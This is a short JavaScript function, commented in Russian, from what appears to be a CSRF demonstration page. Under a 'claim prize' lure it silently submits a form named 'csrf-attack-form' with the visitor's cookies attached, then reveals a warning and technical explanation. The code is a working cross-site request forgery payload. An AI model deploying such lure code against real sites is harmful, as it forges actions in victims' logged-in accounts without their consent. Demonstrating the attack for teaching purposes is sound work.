async function claimPrize() {
  const form = document.getElementById('csrf-attack-form');
  const formData = new FormData(form);

  try {
    // Отправляем форму через fetch, не покидая страницу
    const response = await fetch(form.action, {
      method: form.method,
      body: formData,
      credentials: 'include'  // Важно! Отправляет cookies
    });

  } catch (error) {
    console.error('Ошибка CSRF атаки:', error);
    // alert('Атака не удалась. Убедитесь, что адрес доступен');
  }

  // Показываем предупреждение через секунду
  setTimeout(function () {
    const warningDiv = document.getElementById('warning');
    warningDiv.classList.add('show');

    // Показываем техническую информацию
    const technicalInfo = document.querySelector('.technical-info');
    if (technicalInfo) {
      technicalInfo.style.display = 'block';
    }
  }, 100);

}
